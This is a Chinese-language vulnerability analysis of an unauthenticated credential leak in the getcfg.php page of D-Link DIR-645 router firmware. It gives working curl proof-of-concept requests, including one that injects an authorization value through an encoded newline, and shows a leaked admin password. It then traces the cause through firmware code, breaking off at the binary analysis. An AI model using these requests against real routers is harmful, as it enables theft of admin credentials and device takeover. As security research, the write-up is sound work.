这个漏洞似乎在Dlink很多的产品都存在，此次分析主要是针对dir-645，将该漏洞点从1.02到1.04都分析一遍。
## 漏洞描述
出现问题的页面是`getcfg.php`，`1.02`及其之前，由于没有校验，可直接访问导致信息泄露；`1.02`之后，虽然有权限的检查，但是由于`cgibin`程序中代码逻辑出现了问题，导致可绕过校验，实现泄露。
## 漏洞复现
在官网下载固件，版本是1.02；1.03版本的固件链接以及1.04版本的固件链接。
针对1.02版本固件的[poc代码](https://vuldb.com/?id.7843)如下：
    curl -d SERVICES=DEVICE.ACCOUNT http://xx.xx.xx.xx/getcfg.php
可以看到成功获取admin账号与密码。
    USR-
    admin
    Haan1324
1.03的poc代码
    curl -d "SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1" "http://xx.xx.xx.xx/getcfg.php"
可以看到，能成功获取帐号与密码（admin帐号为空口令）。
同时使用1.02的poc进行测试，看到返回的结果是未授权。
尝试在1.04上进行测试，也是可行，尝试在1.05、1.06上进行测试，仍然成功，这个洞在`dir-645`上面好像没有修补的感觉。
## 漏洞分析
上一步已经将固件下载下来了，用binwalk将固件解压。
首先对1.02版本的漏洞进行分析，根据poc：
    curl -d SERVICES=DEVICE.ACCOUNT http://xx.xx.xx.xx/getcfg.php
直接访问的`getcfg.php`页面，文件在`/htdocs/web/getcfg.php`中。关键代码如下：
    $SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
        TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
        $SERVICE_INDEX = 0;
        while ($SERVICE_INDEX  $cnt) break;
        echo "\t\t\t\n";
        echo "\t\t\t\t".       get("x","uid"). "\n";
        echo "\t\t\t\t".      get("x","name").    "\n";
        echo "\t\t\t\t".     get("x","usrid").   "\n";
        echo "\t\t\t\t".  get("x","password")."\n";
        echo "\t\t\t\t".     get("x", "group").  "\n";
        echo "\t\t\t\t".get("x","description")."\n";
        echo "\t\t\t\n";
    }
到这里1.02版本的信息泄露成因分析结束。
查看1.03版本之后的成因，根据poc，可以看到是在post数据中加入了`attack=ture%0aAUTHORIZED_GROUP=1`。
    curl -d "SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1" "http://xx.xx.xx.xx/getcfg.php"
首先分析之前的poc失败的原因，查看1.03版本文件系统中的`getcfg.php`，文件目录仍然是`/htdocs/web/getcfg.php`,关键代码如下：
    if(is_power_user() == 1)
        {
            /* cut_count() will return 0 when no or only one token. */
            $SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
            TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
            $SERVICE_INDEX = 0;
            while ($SERVICE_INDEX FAILED\n";
            echo "\tNot authorized\n";
        }
可以看到之前的poc失败应该是因为`is_power_user()`返回失败，所以导致输出未授权信息。
查看`is_power_user()`函数：
    function is_power_user()
    {
        if($_GLOBALS["AUTHORIZED_GROUP"] == "")
        {
            return 0;
        }
        if($_GLOBALS["AUTHORIZED_GROUP"]  /htdocs/cgibin
因此去看`/htdocs/cgibin`文件：
    $ file ./htdocs/cgibin
    ./htdocs/cgibin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped